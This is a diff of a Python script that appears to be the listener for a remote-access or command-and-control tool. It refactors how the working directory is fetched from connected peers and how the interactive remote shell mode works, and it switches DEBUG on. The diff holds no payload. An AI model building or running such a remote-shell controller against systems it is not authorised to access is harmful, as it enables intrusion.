@@ -10,7 +10,7 @@ from signal import SIGTERM
 import tasker
 
 VERBOSE = True
-DEBUG = False
+DEBUG = True
 CURRENT_WORKING_DIR = ""
 
 #IGNORE SSL CHECKS
@@ -230,18 +230,14 @@ def get_uuid(conn):
     else:
         return uuid
 
-def get_pwd(conn,mode='print'):
+def get_working_dir(conn):
     global CURRENT_WORKING_DIR
     send_data(conn, "[pwd]")
     CURRENT_WORKING_DIR = listen_for_data(conn,'store')
-    if mode == 'print':    
-        print_info(CURRENT_WORKING_DIR)
-    else:
-        pass
 
 def change_working_dir(conn, path):
     send_data(conn, "[cwd] {}".format(path))
-    get_pwd(conn,mode='print')
+    get_working_dir(conn)
 
 def listen():
     global conn
@@ -299,6 +295,7 @@ def listen():
             print_info("SSL established. Peer: {}".format(conn.getpeercert()))        
             source = "{}:{}".format(fromaddr[0],fromaddr[1])
             cmd = ""
+            get_working_dir(conn)
             if run_tasks is True:
                 #ask for uuid
                 uuid = get_uuid(conn)
@@ -389,11 +386,11 @@ def listen():
                     print_good("Found UUID: {}".format(uuid))
                     cmd = ""
                 elif cmd == "7":
-                    get_pwd(conn,'print')
+                    get_working_dir(conn)
+                    print_info(CURRENT_WORKING_DIR)
                     cmd = ""
                 elif cmd.lower() == "shell":
                     while cmd.lower() == "shell":
-                        get_pwd(conn,'store')
                         prompt = CURRENT_WORKING_DIR + ">"
                         command = input(prompt)
                         forbidden = ['get ', 'get', 'put ', 'put']
@@ -405,7 +402,11 @@ def listen():
                         elif command == "back" or command == "exit" or command == "quit":
                             cmd = ""
                         elif command.startswith("cd "):
-                            change_working_dir(conn,command.lstrip("cd "))
+                            new_dir = command.lstrip("cd ")
+                            if VERBOSE:
+                                print_info("Changing Working Directory:")
+                                print(new_dir)
+                            change_working_dir(conn, new_dir)
                         elif command == "":
                             pass
                         else:
